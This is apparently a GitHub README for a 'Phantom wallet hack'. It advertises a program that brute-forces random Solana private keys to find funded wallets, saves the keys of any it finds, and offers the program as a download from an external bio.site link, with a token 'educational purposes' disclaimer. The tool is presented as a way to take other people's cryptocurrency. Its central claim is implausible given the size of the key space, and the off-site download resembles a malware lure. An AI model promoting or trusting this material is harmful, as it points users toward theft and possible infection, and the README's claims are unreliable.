# Phantom-wallet-hack
An automated solana wallet generator
that brute forces random wallet addresses by checking their balance in real-time

![Phantom X](https://github.com/user-attachments/assets/09df767e-9b18-4195-aa2b-089a82634d4e)

⚠ PLEASE NOTE: This code is only for educational purposes. ⚠
⚠ If you do something illegal expect to be held responsible for your own actions. ⚠

This program uses a brute force algorithm to attempt to discover Solana wallets (used with the Phantom wallet)
that contain positive balances. It works by continuously generating random private keys, converting these keys into their corresponding public wallet addresses
and checking the Solana blockchain for the balance of each address.

https://www.youtube.com/watch?v=G8IlkZfr61w

![4850 sp3ow1 192x192](https://github.com/user-attachments/assets/5c73c63d-dc50-4969-9717-cfcb74259df5)

Key Features:
Phrase Generation: All generated seed phrases are stored in a file named phrases.txt, located in the banana folder.
Successful Results: If a wallet with a positive balance is found, the private key, public key, and wallet address are saved in a file named WIN.txt, also in the banana folder.
Download:
The application can be downloaded at https://bio.site/PhantomX.
